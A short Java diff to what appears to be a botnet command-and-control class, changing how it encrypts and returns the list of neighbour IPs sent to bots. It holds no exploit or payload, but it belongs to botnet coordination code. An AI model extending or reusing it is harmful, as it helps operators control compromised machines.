@@ -1,5 +1,8 @@
 package cs.sii.control.command;
 
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.OutputStream;
 import java.io.UnsupportedEncodingException;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
@@ -196,7 +199,7 @@ public class Commando {
 	 * @throws NoSuchAlgorithmException
 	 * @throws InvalidKeyException
 	 */
-	public ArrayList<String> getNeighbours(String data)
+	public ByteArrayOutputStream getNeighbours(String data)
 			throws InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, UnsupportedEncodingException,
 			InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
 		String idBot;
@@ -247,10 +250,17 @@ public class Commando {
 			} catch (InvalidKeySpecException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
-			}
+			}	//	OutputStream ostream=  
+
+		}	ByteArrayOutputStream ostream = new ByteArrayOutputStream();
+		try {
+			pki.getCrypto().encrypt(ipN, ostream);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
 		}
 
-		return pki.getCrypto().encodeObjs(ipN);
+		return ostream;
 	}
 
 	// TODO inserire metodi che inviano i comandi alla rete a comando dal sito
